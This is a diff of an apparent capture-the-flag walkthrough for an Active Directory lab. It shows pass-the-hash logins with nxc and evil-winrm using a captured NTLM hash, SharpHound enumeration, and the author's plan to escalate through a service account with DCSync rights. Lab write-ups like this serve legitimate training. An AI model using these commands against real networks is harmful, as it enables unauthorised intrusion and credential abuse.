@@ -334,7 +334,7 @@ sudo nginx -t && sudo systemctl reload nginx
 
 **Then it will redirect to login page click login**&#x20;
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 **after fuzzing another time and crawling the app i found in the audit this**&#x20;
 
@@ -1968,5 +1968,74 @@ nxc smb 172.16.0.10 -u "svc-aegis-deploy" -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
 evil-winrm -i 172.16.0.10 -u "svc-aegis-deploy" -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
 upload /home/gb05/Desktop/CPTS_PREP/ADtools/SharpHound.exe
 .\SharpHound.exe -c All -d odyssey.htb
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 12**</mark>
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**I think my next target is svc stream because he has DCSync on the domain we need to found how to pivot to him**&#x20;
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**so we can query the DC server,**
+
+**logiccaly since we see svc deploy for the app it can have the source code of the APP that may lead us to something new**
+
+{% code overflow="wrap" %}
+```powershell
+cd "C:\Program Files\Aegis Stream Collector"
+-a----          5/8/2026  12:44 PM          13824 AegisStream.Common.dll
+-a----          5/9/2026  12:00 AM          30561 AegisStreamSvc.deps.json
+-a----          5/9/2026  12:00 AM          39424 AegisStreamSvc.dll
+-a----          5/9/2026  12:00 AM         152064 AegisStreamSvc.exe
+-a----          5/8/2026  12:44 PM            440 AegisStreamSvc.runtimeconfig.json
+-a----          5/8/2026  12:44 PM          27627 AegisStreamWatchdog.deps.json
+-a----          5/8/2026  12:44 PM          13312 AegisStreamWatchdog.dll
+-a----          5/8/2026  12:44 PM         152064 AegisStreamWatchdog.exe
+-a----          5/8/2026  12:44 PM            328 AegisStreamWatchdog.runtimeconfig.json
+-a----          5/8/2026  12:44 PM            137 appsettings.json
+-a----          5/8/2026  12:44 PM          27936 Microsoft.Extensions.Configuration.Abstractions.dll
+-a----          5/8/2026  12:44 PM          42784 Microsoft.Extensions.Configuration.Binder.dll
+-a----          5/8/2026  12:44 PM          24736 Microsoft.Extensions.Configuration.CommandLine.dll
+-a----          5/8/2026  12:44 PM          43800 Microsoft.Extensions.Configuration.dll
+-a----          5/8/2026  12:44 PM          21280 Microsoft.Extensions.Configuration.EnvironmentVariables.dll
+-a----          5/8/2026  12:44 PM          27936 Microsoft.Extensions.Configuration.FileExtensions.dll
+-a----          5/8/2026  12:44 PM          26920 Microsoft.Extensions.Configuration.Json.dll
+-a----          5/8/2026  12:44 PM          25384 Microsoft.Extensions.Configuration.UserSecrets.dll
+-a----          5/8/2026  12:44 PM          63768 Microsoft.Extensions.DependencyInjection.Abstractions.dll
+-a----          5/8/2026  12:44 PM          92952 Microsoft.Extensions.DependencyInjection.dll
+-a----          5/8/2026  12:44 PM          30480 Microsoft.Extensions.Diagnostics.Abstractions.dll
+-a----          5/8/2026  12:44 PM          35592 Microsoft.Extensions.Diagnostics.dll
+-a----          5/8/2026  12:44 PM          22176 Microsoft.Extensions.FileProviders.Abstractions.dll
+-a----          5/8/2026  12:44 PM          44808 Microsoft.Extensions.FileProviders.Physical.dll
+-a----          5/8/2026  12:44 PM          45848 Microsoft.Extensions.FileSystemGlobbing.dll
+-a----          5/8/2026  12:44 PM          51472 Microsoft.Extensions.Hosting.Abstractions.dll
+-a----          5/8/2026  12:44 PM          72488 Microsoft.Extensions.Hosting.dll
+-a----          5/8/2026  12:44 PM          29872 Microsoft.Extensions.Hosting.WindowsServices.dll
+-a----          5/8/2026  12:44 PM          65320 Microsoft.Extensions.Logging.Abstractions.dll
+-a----          5/8/2026  12:44 PM          27912 Microsoft.Extensions.Logging.Configuration.dll
+-a----          5/8/2026  12:44 PM          71464 Microsoft.Extensions.Logging.Console.dll
+-a----          5/8/2026  12:44 PM          20248 Microsoft.Extensions.Logging.Debug.dll
+-a----          5/8/2026  12:44 PM          50976 Microsoft.Extensions.Logging.dll
+-a----          5/8/2026  12:44 PM          25760 Microsoft.Extensions.Logging.EventLog.dll
+-a----          5/8/2026  12:44 PM          34568 Microsoft.Extensions.Logging.EventSource.dll
+-a----          5/8/2026  12:44 PM          22688 Microsoft.Extensions.Options.ConfigurationExtensions.dll
+-a----          5/8/2026  12:44 PM          64776 Microsoft.Extensions.Options.dll
+-a----          5/8/2026  12:44 PM          43680 Microsoft.Extensions.Primitives.dll
+-a----          5/8/2026  12:44 PM         172704 System.Diagnostics.EventLog.dll
+-a----          5/8/2026  12:44 PM         801080 System.Diagnostics.EventLog.Messages.dll
+-a----          5/8/2026  12:44 PM          87728 System.ServiceProcess.ServiceController.dll
+-a----          5/8/2026   4:09 PM         235520 YamlDotNet.dll
+```
+{% endcode %}
+
+**we check our permissions in this folder for the app**&#x20;
+
+{% code overflow="wrap" %}
+```powershell
+ icacls "C:\Program Files\Aegis Stream Collector"
+ # BUILTIN\Users:(I)(RX) 
 ```
 {% endcode %}
